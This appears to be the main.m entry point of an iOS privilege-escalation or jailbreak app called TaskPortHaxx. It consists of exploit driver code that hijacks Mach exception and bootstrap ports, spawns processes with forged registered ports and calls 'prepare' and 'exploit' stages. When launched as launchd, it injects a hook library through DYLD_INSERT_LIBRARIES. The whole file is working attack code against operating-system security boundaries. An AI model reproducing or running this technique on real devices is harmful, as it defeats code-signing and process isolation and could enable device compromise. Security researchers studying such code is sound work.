//
//  main.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 24/10/25.
//

#import <IOKit/IOKitLib.h>
#import <UIKit/UIKit.h>
#include <roothide.h>
#import "Header.h"

int child_execve(char *exceptionPortName, char *path) {
    mach_port_t exception_port = MACH_PORT_NULL;
    mach_port_t fake_bootstrap_port = MACH_PORT_NULL;
    bootstrap_look_up(bootstrap_port, exceptionPortName, &exception_port);
    assert(exception_port != MACH_PORT_NULL);
    bootstrap_look_up(bootstrap_port, "com.kdt.taskporthaxx.fake_bootstrap_port", &fake_bootstrap_port);
    assert(fake_bootstrap_port != MACH_PORT_NULL);
    
    task_set_exception_ports(mach_task_self(),
        EXC_MASK_ALL | EXC_MASK_CRASH,
        exception_port,
        EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES,
        ARM_THREAD_STATE64);
    mach_port_t bootstrapPort = bootstrap_port;
    task_set_bootstrap_port(mach_task_self(), fake_bootstrap_port);
    
    posix_spawnattr_t attr;
    if(posix_spawnattr_init(&attr) != 0) {
        perror("posix_spawnattr_init");
        return 1;
    }
    
    if(posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETEXEC) != 0) {
        perror("posix_spawnattr_setflags");
        return 1;
    }
    
    posix_spawnattr_set_registered_ports_np(&attr, (mach_port_t[]){0, bootstrapPort, fake_bootstrap_port}, 3);
    posix_spawnattr_setexceptionports_np(&attr,
        EXC_MASK_ALL | EXC_MASK_CRASH,
        exception_port, EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
    char *argv2[] = { path, NULL };
    int ret =posix_spawn(NULL, argv2[0], NULL, &attr, argv2, environ);
    printf("posix_spawn error: %s\n", strerror(ret));
    return ret;
}

@interface TaskPortHaxx : NSObject
- (void)prepare;
- (void)exploit:(NSString*)execDir;
@end

int main(int argc, char * argv[]) {
    
    if(strcmp(argv[0], "/sbin/launchd") == 0) {
        // FILE* fp = fopen("/var/log/launchd.log", "w+");
        // if (fp) {
        //     fprintf(fp, "launchd started args:\n");
        //     for (int i = 0; i < argc; i++) {
        //         fprintf(fp, "%s\n", argv[i]);
        //     }
        //     fflush(fp);
        //     fprintf(fp, "launchd started with environment variables:\n");
        //     for (char **env = environ; *env != 0; env++) {
        //         fprintf(fp, "%s\n", *env);
        //     }
        //     fflush(fp);
        //     fprintf(fp, "jbroot: %s\n", jbroot("/"));
        //     fclose(fp);
        // }
        setenv("DYLD_INSERT_LIBRARIES", jbroot("/basebin/launchdhook.dylib"), 1);
        return execve(jbroot("/.sysroot/sbin/launchd"), argv, environ);
    }
    
#if !DTSECURITY_WAIT_FOR_DEBUGGER
    char *startSuspended = getenv("HAXX_START_SUSPENDED");
    if (startSuspended && atoi(startSuspended)) {
        kill(getpid(), SIGSTOP);
    }
#endif

    if (argv[1] && strcmp(argv[1], "xpcproxy")==0)
    {
        assert(argc==3);

        char *path = argv[2];
        char *portName = getenv("HAXX_EXCEPTION_PORT_NAME");
        assert(child_execve(portName, path) == 0);
    }

    if (argv[1] && strcmp(argv[1], "prepare")==0)
    {
        assert(argc==3);
        int child_stage1_prepare(NSString* execDir);
        return child_stage1_prepare(@(argv[2]));
    }

    assert(argc <= 2);

    TaskPortHaxx* worker = [TaskPortHaxx new];

    [worker prepare];
    [worker exploit: argc==2 ? @(argv[1]) : nil];

    void clearXpcStagingFiles();
    clearXpcStagingFiles();

    // dispatch_main();
    printf("done.\n");
    
    return 0;
}
